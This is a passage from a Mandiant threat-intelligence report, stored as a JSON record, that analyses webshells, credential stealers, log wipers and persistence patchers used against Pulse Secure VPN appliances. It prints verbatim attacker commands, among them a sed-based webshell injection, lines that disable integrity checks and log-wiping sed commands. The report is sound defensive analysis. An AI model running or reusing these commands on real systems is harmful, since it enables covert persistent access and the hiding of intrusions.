invoked when it receives a form submission name=value\npair of serverid matching a secret key. This causes the webshell to extract the string passed\nto it via the QUERY_STRING CGI environment variable. Individual key/value pairs delimited\nby the & character and are URL decoded. Although the script parses out all key/value pairs it\nreceives, it specifically looks for and extracts data associated with the cmd parameter. If\nfound, it will generate a form containing the extracted cmd to be executed and the previous\nserverid value along with a form submission button named Run. Upon submission, the\nwebshell will execute the passed command on the victim host's command line and display\nthe results to the attacker before exiting. If no cmd value was extracted, the webshell will\nsimply output a </pre> HTML tag.\n\nPULSECHECK\n\nThe file secid_canceltoken.cgi (SHA256:\na1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1) is a webshell\nwritten in Perl that enables arbitrary command execution. With a properly formatted request,\nthe script will execute webshell code. Otherwise, the legitimate welcome page of the Pulse\nSecure VPN software is presumably invoked.\n\nThe script checks for web requests using the HTTP POST method and, if found, will further\ncheck the HTTP request headers for the CGI environment variable HTTP_X_KEY. If this\nheader matches a backdoor key, then the malware will output the result of the command sent\nin the variable HTTP_X_CMD. This data is RC4 encrypted and base64-encoded. The\npassphrase to decrypt is sent in the environment variable HTTP_X_CNT. The webshell will\nset the content type to Content-type:text/html and the command output printed. Following\nthis, the script exits.\n\nQUIETPULSE\n\nThe file dsserver (SHA256:\n9f6ac39707822d243445e30d27b8404466aa69c61119d5308785bf4a464a9ebd) is a\nlegitimate Perl script with malicious modifications to fork the child process\n/home/bin/dshelper. The dshelper script does not exist on a clean PulseSecure installation,\nthis file is described as QUIETPULSE Utility Script.\n\nQUIETPULSE Utility Script\n\nThe file dshelper (SHA256:\nc774eca633136de35c9d2cd339a3b5d29f00f761657ea2aa438de4f33e4bbba4) is a shell\nscript invoked by a malicious version of dsserver that primarily functions as a utility script\nresponsible for copying files and executing commands. Like the ATRIUM patcher, this script\naccesses /tmp/data a path which is used during a system upgrade This file is therefore like\n\n\n-----\n\nthe ATRIUM patcher, used by the attacker to maintain persistence. The script is set to\nexecute in a loop where four main checks are executed every two minutes. The checks are\nas follows:\n\n_Check 1_\n\nIf /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi exists and is nonempty then execute:\n\ngrep -c -s 'system($depara)' /tmp/data/root/home/webserver/htdocs/danana/auth/compcheckjava.cgi\n\nIt checks if the file has the contents system($depara). If the file does not contain this content,\nthen retrieve the first line of the file by executing:\n\nsed -n 1p /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi\n\nThen copy a file via:\n\ncp /home/webserver/htdocs/dana-na/auth/compcheckjava.cgi\n/tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi\n\nThen replace the copy’s first line with the one retrieved from the sed above via:\n\nsed -i 1c\"<varies>\" /tmp/data/root/home/webserver/htdocs/danana/auth/compcheckjava.cgi\n\n_Check 2_\n\nIf /tmp/data/root/home/bin/ exists as a directory, then check if the file\n/tmp/data/root/home/bin/dshelper does not exist. If it does not exist, then place it there by\ncopying a file via:\n\ncp -p /home/bin/dshelper /tmp/data/root/home/bin/\n\n_Check 3_\n\nIf /tmp/data/root/home/bin/dsserver exists and is non-empty then execute the following to\ncheck if the file does not contain the string exec(\"/home/bin/dshelper\"):\n\ngrep -c -s 'exec(\"/home/bin/dshelper\")' /tmp/data/root/home/bin/dsserver\n\nIf it doesn't then execute to insert the line:\n\nsed -i 's/for (;;)/my $monpid = fork();\\nif ($monpid == 0)\n{\\nexec(\\\"\\/home\\/bin\\/dshelper\\\");\\n}\\n&/g' /tmp/data/root/home/bin/dsserver\n\n\n-----\n\n_Check 4_\n\nIf the file /tmp/data/root/home/bin/check_integrity.sh exists and is non-empty, then check if\nthe file contains the string exit 1 by executing:\n\ngrep -c -s 'exit 1' /tmp/data/root/home/bin/check_integrity.sh\n\nIf the file does contain this content, then execute the following to switch the content to exit 0:\n\nsed -i 's/exit 1/exit 0/g' /tmp/data/root/home/bin/check_integrity.sh\n\nPULSEJUMP\n\nThe file with SHA256:\n7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a is a system\ninformation and credential harvesting Perl script. The sample writes information from multiple\nsources to the file /tmp/dsactiveuser.statementcounters in append mode.\n\nThe sample begins by retrieving all auth servers via the API AuthAdmin::getAllAuthServers.\nand logs the results. Next, the sample logs all roles via the\nAPI DSRole::GeneralAdmin::getRoles and writes the values to the file. The sample may also\nretrieve and log additional information depending on the device configuration.\n\nHARDPULSE\n\nThe file compcheckjava.cgi (SHA256:\n1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc) has the\nability to read and write arbitrary files and may execute arbitrary commands depending on\nthe implementation of a particular library function.\n\nThe sample responds to HTTP GETs and PUTs. The GET path is not relevant, but the PUT\npath first checks if the incoming requests checkcode POST param is equal to a hardcoded\npasscode. If this check passes the sample inspects the param hashid to determine if it's nonempty. If non-empty the sample displays a prompt to the user that includes hardware\ninformation and then base64 decodes the param hashid and checks it against pulsesecure. If\nthis matches a recoveryToken is generated which is the MD5 hash of 16 random bytes, with\nthe result hash truncated to 8 characters. This token is then displayed to the user via the\nURL https://ive-host/dana-na/auth/recover[.]cgi?token=<varies> and the sample exits. If this\ncheck did not match then the sample passes the base64 decoded data to a routine\nDSSafe::psystem which may execute shell commands, however this implementation is not\nprovided and is speculation.\n\nIf the param hashid is empty the sample instead checks that the param m is non-empty. If so,\nit's matched against get and put which will read/write arbitrary files to the host, respectively.\n\nATRIUM\n\n\n-----\n\nThe file compcheckresult.cgi (SHA256:\nf2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90) is a webshell\ncapable of arbitrary command execution. The sample has malicious logic inserted at the end\nof legitimate logic. The malicious logic inspects all requests of any type looking for the HTTP\nquery parameter id. If this query parameter exists, the sample executes it verbatim on using\nthe system API. The sample does not encode or obfuscate the command in any way. If the\nquery parameter is not found in the request, then the original legitimate logic is invoked.\n\nPersistence Patcher\n\nThe file DSUpgrade.pm (SHA256:\n224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450) is a patcher\nutility script responsible for persisting webshells across a system upgrade. We’ve observed\nvariants of this utility targeting the persistence of multiple webshell families, notably ATRIUM,\nSTEADYPULSE, and PULSECHECK. Like previous patchers, this sample uses sed to insert\nmalicious logic. The attacker likely chose DSUpgade.pm to host their patch logic as it is a\ncore file in the system upgrade procedure, ensuring the patch is during updates. The patcher\nmodifies content in /tmp/data as this directory holds the extracted upgrade image the newly\nupgraded system will boot into. This results in a persistence mechanism which allows the\nattacker to maintain access to the system across updates.\n\nmy $cmd_x=\"sed -i '/echo_console \\\"Saving package\\\"/i(\nsed -i \\\\\\'/main();\\\\\\$/cif(CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\")){\nprint \\\\\\\\\\\"Cache-Control: no-cache\\\\\\\\\\\\\\\\n\\\\\\\\\\\";\nprint \\\\\\\\\\\"Content-type: text/html\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\";\nmy \\\\\\\\\\$na=CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\");\nsystem(\\\\\\\\\\\"\\\\\\\\\\$na\\\\\\\");\n} else{\n&main();\n}\\\\\\' /tmp/data/root$cgi_p;\ncp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;\ncp -f /pkg/dspkginstall /tmp/data/root/pkg/;\n)'/pkg/do-install\";\n\nThe patcher also performs additional shell commands for unpacking a compressed package:\n\nsystem(\"/bin/mount -o remount,rw /dev/root /\");\nsystem(\"/bin/tar\", \"-xzf\", \"/tmp/new-pack.tgz\", \"-C\", \"/tmp\",\"./installer\");\nsystem(\"cp -f /tmp/installer/do-install /pkg/\");\nsystem(\"cp -f /tmp/installer/VERSION /pkg/\");\nsystem(\"cp -f /tmp/installer/sysboot-shlib /pkg/\");\nsystem(\"cp -f /tmp/installer/losetup /pkg/\");\n\nPACEMAKER\n\n\n-----\n\nThe file memread (SHA256:\n68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2) is a credential\nstealer. The sample has the usage information:\n\nUsage: memread [-t time(minute)] [-m size(MB)] [-s sleep_interval(second)]\n\nThe sample starts by setting an alarm that kills the application after a configurable number of\nminutes, 14 by default. It then enters a loop which reads /proc/ entries every 2 seconds\nlooking for a target application, this interval is also configurable. The target is found by\nopening /proc/<process_name>/cmdline for each entry in the folder and then reading this file\nlooking for the string dswsd within the command line. Once found the target application's\nproc/<target_pid>/mem is opened, the process is attached to with PTRACE, then memory\nread in chunks up to 512 bytes in size. For each chunk, the string 20 30 20 0A 00 ( 0 \\n) is\nsearched for as a needle. If found the sample splits the data by first space, then a dash -.\nTwo dashes are expected to be found, and these are immediately converted into hex\nnumbers, example form: -<number>. If the second number minus the first is > 8191 the\nsample reads the data starting at the file offset of the first number, up to a size specified by\nsecond number minus first number.\n\nOnce the sample has read the process memory and found all memory data of interest the\nsample detaches PTRACE then the sample begins memory scanning the copied data. The\nsample tries to locate a sequence of 'flags' in memory one by one to locate what seem to be\ninformation the attacker wishes to steal. This information is not known, nor is the structure of\nit. The sequences scanned for generally have start and end scan sequences which in order\nscanned for, are:\n\nUSER_START_FLAG: 3C 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 05 00\nUSER_END_FLAG: 3C 2F 05 08 75 73 65 72 4E 61 6D 65 05 01 3E 00\nPASSWORD_START_FLAG: 3C 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00\nPASSWORD_END_FLAG: 3C 2F 05 08 70 61 73 73 77 6F 72 64 05 01 3E 00\nAUTHNUM_START_FLAG: 3C 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00\nAUTHNUM_END_FLAG: 3C 2F 05 0A 61 75 74 68 4E 75 6D 62 65 72 05 01 3E 00\n\nIf all these sequences are found, the data between the start and end is extracted and\neventually formatted and written to the file /tmp/dsserver-check.statementcounters. The\napproximate format of this data is:\n\nName:<username> || Pwd:<password> || AuthNum:<authnumber>\\n\n\nThe sample replaces the following URL encoded values with their ascii representation for the\npassword:\n\n&amp; -> &\n&lt; -> <\n&gt; -> >\n\n\n-----\n\nPACEMAKER Launcher Utility\n\nAs part of our investigation into PACEMAKER we were able to retrieve a simple bash script\nresponsible for launching the credential stealer. The launcher script hash SHA256\n4c5555955b2e6dc55f52b0c1a3326f3d07b325b112060329c503b294208960ec launches\nPACEMAKER from a hardcoded path with options specifying a 16MB memory read size and\na memory scan interval of 2 seconds, with a variable self-kill time.\n\n#!/bin/bash\n\n/home/bin/memread -t $1 -m 16 -s 2 &\n\nTHINBLOOD Log Wiper Utility\n\nThe file dsclslog with SHA256\n88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079 is a log wiper\nutility. The sample provides the usage information:\n\nUsage: dsclslog -f [events|access] -r [Regex1,Regex2,Regex3,...]\n\nThe –f flag specifies if the file log.events.vc0 or log.access.vc0 within the directory\n/home/runtime/logs should be modified. To perform its log cleaning operations the sample\nfirst makes two copies of whichever log file was chosen, but uses .vc1 and .vc2 as the\nextension for the new files. The file with the .vc1 is used to search for entries that match the\ngiven entries, and the file with the .vc2 extension is used as a temporary file where the\ncleaned log is written. After generating both files and log cleaning is finished the sample\nexecutes the following commands via the system API to overwrite the original log with the\ncleaned version, then removes the intermediate:\n\nmv /home/runtime/logs/log.<logtype>.vc2\n/home/runtime/logs/log.<logtype>.vc0\nrm /home/runtime/logs/log.<logtype>.vc1\n\nTHINBLOOD LogWiper Utility Variant\n\nThe file clear_log.sh (SHA256:\n1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9) is a BASH\nscript responsible for zeroing log lines that match a given regex pattern. The sample is\nsimilar to the compiled THINBLOOD Log Wiper but edits logs in-place with sed rather than\nmaking temporary copies. The sed commands used are:\n\nsed -i \"s/.\\x00[^\\x00]*<regex_string>[^\\x00]*\\x09.\\x00//g\" /data/runtime/logs/<logfile>\n\nsed -i \"s/\\x<hex_char>\\x00[^\\x00]*$2[^\\x00]*\\x09\\x<hex_char>\\x00//g\"\n/data/runtime/logs/<logfile>\n\nThe sample embeds the usage information:\n\n\n-----\n\nusage: /home/bin/bash clear_log.sh [logfile] [keyword(regex)]\n\nLOCKPICK\n\nThe file libcrypto.so (SHA256:\n2610d0372e0e107053bc001d278ef71f08562e5610691f18b978123c499a74d8) is a shared\nobject containing cryptographic logic from openssl. The sample contains a modification to the\nroutine bnrand_range that breaks the security of the random numbers generated. There are\nthree paths in this routine for generating a random big number between a given range. The\nfirst case is unmodified and generates a zeroed big number, the other two cases are patched\nso that a constant value overwrites the generated random value and always returns success.\nThis breaks the random number generation by replacing it with a value the attacker knows in\nall cases.\n\nLOCKPICK Patcher\n\nThe file with the hash\nb990f79ce80c24625c97810cb8f161eafdcb10f1b8d9d538df4ca9be387c35e4 is a patcher\nutility responsible for inserting the malicious logic known as LOCKPICK. The patcher starts\nby running sed on the integrity checker script built into the appliance to insert an early exit\nroutine. This is inserted by the command sed -i '12aexit 0' /home/bin/check_integrity.sh which\nwhen applied causes this script to exit without performing its intended checks. After this the\nsample uses python file read/write APIs to insert long strings of assembly that represent the\nlogic known as LOCKPICK. This file is different from the other patchers we’ve identified in\nthat it is python and specifically targets system integrity routines.\n\n**Detecting the Techniques**\n\nThe following table contains specific FireEye product detection names for the malware\nfamilies associated with the exploitation of Pulse Secure VPN device.\n\n**Platform(s)** **Detection Name**\n\n\nNetwork Security\n\nEmail Security\n\nDetection On Demand\n\nMalware File Scanning\n\nMalware File Storage\nScanning\n\n\nFE_APT_Webshell_PL_HARDPULSE_1\n\nFEC_APT_Webshell_PL_HARDPULSE_1\n\nAPT.Webshell.PL.HARDPULSE\n\nFE_APT_Trojan_PL_PULSEJUMP_1\n\nFEC_APT_Trojan_PL_PULSEJUMP_1\n\nFE_Trojan_PL_Generic_1\n\nFE_APT_Trojan_PL_RADIALPULSE_1\n\nFEC_APT_Trojan_PL_RADIALPULSE_1\n\nFE_APT_Trojan_PL_RADIALPULSE_2\n\nFE_APT_Trojan_PL_RADIALPULSE_3\n\nFEC_APT_Trojan_PL_RADIALPULSE_2\n\nFE_APT_Trojan_PL_RADIALPULSE_4\n\nFEC_APT_Trojan_PL_RADIALPULSE_3\n\n\n-----\n\nFE_APT_Trojan_PL_RADIALPULSE_5\nFE_APT_Tool_SH_RADIALPULSE_1\nFEC_APT_Tool_SH_RADIALPULSE_1\n\nFE_APT_Trojan_Linux32_PACEMAKER_1\nFE_APT_Trojan_Linux_PACEMAKER_1\n\nFE_APT_Backdoor_Linux32_SLOWPULSE_1\nFE_APT_Backdoor_Linux32_SLOWPULSE_2\nFE_APT_Trojan_Linux32_SLOWPULSE_1\nFE_APT_Tool_Linux32_SLOWPULSE_1\n\nFE_APT_Webshell_PL_STEADYPULSE_1\nFEC_APT_Webshell_PL_STEADYPULSE_1\nAPT.Webshell.PL.STEADYPULSE\n\nFE_APT_Trojan_Linux32_LOCKPICK_1\n\nFE_Webshell_PL_ATRIUM_1\nFEC_Webshell_PL_ATRIUM_1\nFE_Trojan_SH_ATRIUM_1\n\nFE_APT_Webshell_PL_SLIGHTPULSE_1\nFEC_APT_Webshell_PL_SLIGHTPULSE_1\nAPT.Webshell.PL.SLIGHTPULSE\n\nFE_APT_Webshell_PL_PULSECHECK_1\nFEC_APT_Webshell_PL_PULSECHECK_1\n\nFE_APT_Tool_Linux32_THINBLOOD_1\nFE_APT_Tool_Linux_THINBLOOD_1\nFE_APT_Tool_SH_THINBLOOD_1\nFEC_APT_Tool_SH_THINBLOOD_1\nAPT.Tool.Linux.THINBLOOD.MVX\n\nFE_APT_Trojan_PL_QUIETPULSE_1\nFEC_APT_Trojan_PL_QUIETPULSE_1\nFE_Trojan_SH_Generic_2\nFEC_Trojan_SH_Generic_3\n\nSuspicious Pulse Secure HTTP request (IPS)\n\nEndpoint Security Real-Time (IOC)\n\nSLOWPULSE (BACKDOOR)\nPACEMAKER (LAUNCHER)\nTHINBLOOD (UTILITY)\n\n\n-----\n\nHelix VPN ANALYTICS [Abnormal Logon]\n\nEXPLOIT - SONICWALL ES [CVE-2021-20021\nAttempt]\n\nEXPLOIT - SONICWALL ES [CVE-2021-20021\nSuccess]\n\nEXPLOIT - SONICWALL ES [CVE-2021-20023 Attempt]\n\nEXPLOIT - SONICWALL ES [CVE-2021-20023\nSuccess]\n\n**Mandiant Security Validation Actions**\n\nOrganizations can validate their security controls using the following actions with Mandiant\nSecurity Validation.\n\n**VID** **Title**\n\n\nA101596\n\nA101597\n\nA101598\n\nA101599\n\nA101600\n\nA101601\n\nA101602\n\nA101604\n\n\nMalicious File Transfer - SLOWPULSE, Download, Variant #1\n\nMalicious File Transfer - SLOWPULSE, Download, Variant #2\n\nMalicious File Transfer - SLOWPULSE, Download, Variant #3\n\nMalicious File Transfer - SLOWPULSE, Download, Variant #4\n\nMalicious File Transfer - SLOWPULSE, Download, Variant #5\n\nMalicious File Transfer - SLOWPULSE, Download, Variant #6\n\nMalicious File Transfer - SLOWPULSE, Download, Variant #7\n\nMalicious File Transfer - Pulse Secure Vulnerability, Utility, Download, Variant\n#1\n\n\n-----\n\nA101605\n\nA101606\n\nA101607\n\nA101608\n\nA101609\n\nA101610\n\nA101611\n\nA101612\n\nA101613\n\nA101614\n\nA101615\n\nA101616\n\nA101617\n\n\nMalicious File Transfer - RADIALPULSE, Download, Variant #1\n\nMalicious File Transfer - PULSEJUMP, Download, Variant #1\n\nMalicious File Transfer - HARDPULSE, Download, Variant #1\n\nMalicious File Transfer - SLIGHTPULSE, Download, Variant #1\n\nMalicious File Transfer - LOCKPICK, Patcher, Download, Variant #1\n\nMalicious File Transfer - LOCKPICK, Download, Variant #1\n\nMalicious File Transfer - ATRIUM, Patcher, Download, Variant #1\n\nMalicious File Transfer - PACEMAKER, Launcher, Download, Variant #1\n\nMalicious File Transfer - PACEMAKER, Download, Variant #1\n\nMalicious File Transfer - QUIETPULSE Utility, Download, Variant #1\n\nMalicious File Transfer - QUIETPULSE, Download, Variant #1\n\nMalicious File Transfer - STEADYPULSE, Download, Variant #2\n\nMalicious File Transfer - STEADYPULSE, Download, Variant #1\n\n\n-----\n\nA101618\n\nA101619\n\nA101620\n\nA101621\n\nA101622\n\nA104757\n\nA104758\n\nA104759\n\nA104760\n\n\nMalicious File Transfer - ATRIUM, Download, Variant #1\n\nMalicious File Transfer - THINBLOOD, Download, Variant #1\n\nMalicious File Transfer - THINBLOOD, Download, Variant #2\n\nMalicious File Transfer - PULSECHECK, Download, Variant #1\n\nMalicious File Transfer - PULSECHECK, Download, Variant #2\n\nHost CLI - QUIETPULSE Utility, Check, Variant #1\n\nHost CLI - QUIETPULSE Utility, Check, Variant #2\n\nHost CLI - QUIETPULSE Utility, Check, Variant #3\n\nHost CLI - QUIETPULSE Utility, Check, Variant #4\n\n\n**Acknowledgements**\n\nMandiant would like to thank the Stroz Friedberg DFIR and Security Testing teams for their\ncollaboration with the analysis and research. The team would also like to thank Joshua\nVillanueva, Regina Elwell, Jonathan Lepore, Dimiter Andonov, Josh Triplett, Jacob\nThompson and Michael Dockry for their hard work in analysis and blog content.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-20 - Check Your Pulse- Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day.pdf"
    ],
    "report_names": [
        "2021-04-20 - Check Your Pulse- Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day.pdf"
    ],
    "threat_actors": [
        {
            "id": "e44de7cd-80f0-4f0e-a348-33da1947fd25",
            "created_at": "2023-12-08T02:00:05.724516Z",
            "updated_at": "2025-03-27T02:00:03.261772Z",
            "deleted_at": null,
            "main_name": "UNC2717",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC2717",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7e75ee53-c4d3-4260-8106-ed7b61d35f02",
            "created_at": "2023-12-08T02:00:05.765868Z",
            "updated_at": "2025-03-27T02:00:03.269367Z",
            "deleted_at": null,
            "main_name": "UNC2630",
            "aliases": [],
            "source_name": "MISPGALAXY:UNC2630",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "13bedce4-3115-4563-afd5-068e3930e68e",
            "created_at": "2023-01-06T13:46:38.623775Z",
            "updated_at": "2025-03-27T02:00:02.8761Z",
            "deleted_at": null,
            "main_name": "APT5",
            "aliases": [
                "KEYHOLE PANDA",
                "BRONZE FLEETWOOD",
                "TEMP.Bottle",
                "Mulberry Typhoon",
                "Poisoned Flight"
            ],
            "source_name": "MISPGALAXY:APT5",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e0ffe8ec-caee-414f-8fd5-b69ffd262e6f",
            "created_at": "2024-05-01T02:03:07.950544Z",
            "updated_at": "2025-03-27T02:05:17.265795Z",
            "deleted_at": null,
            "main_name": "BRONZE FLEETWOOD",
            "aliases": [
                "DPD ",
                "Keyhole Panda ",
                "Mulberry Typhoon ",
                "Poisoned Flight ",
                "TG-2754 ",
                "APT5 "
            ],
            "source_name": "Secureworks:BRONZE FLEETWOOD",
            "tools": [
                " Comfoo",
                " Gh0st RAT",
                " Isastart",
                " Leouncia",
                " OrcaRAT",
                " PCShare",
                " Skeleton Key",
                " SlyPidgin",
                " VinSelf",
                "Binanen"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "6d69ef1b-b6f3-47e1-be5a-87ac0fd5ff55",
            "created_at": "2024-04-24T02:00:49.599348Z",
            "updated_at": "2025-03-27T02:00:55.521185Z",
            "deleted_at": null,
            "main_name": "APT5",
            "aliases": [
                "APT5",
                "Mulberry Typhoon",
                "BRONZE FLEETWOOD",
                "Keyhole Panda",
                "UNC2630"
            ],
            "source_name": "MITRE:APT5",
            "tools": [
                "Tasklist",
                "PoisonIvy",
                "RAPIDPULSE",
                "PcShare",
                "Mimikatz",
                "SLOWPULSE",
                "SLIGHTPULSE",
                "Skeleton Key",
                "gh0st RAT",
                "PULSECHECK",
                "netstat"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535937,
    "ts_updated_at": 1743041725,
    "ts_creation_date": 1653759132,
    "ts_modification_date": 1653759132,
    "files": {
        "pdf": "https://archive.orkl.eu/d0176a331fa0e89b22991370b3d56df1c799f93f.pdf",
        "text": "https://archive.orkl.eu/d0176a331fa0e89b22991370b3d56df1c799f93f.txt",
        "img": "https://archive.orkl.eu/d0176a331fa0e89b22991370b3d56df1c799f93f.jpg"
    }
}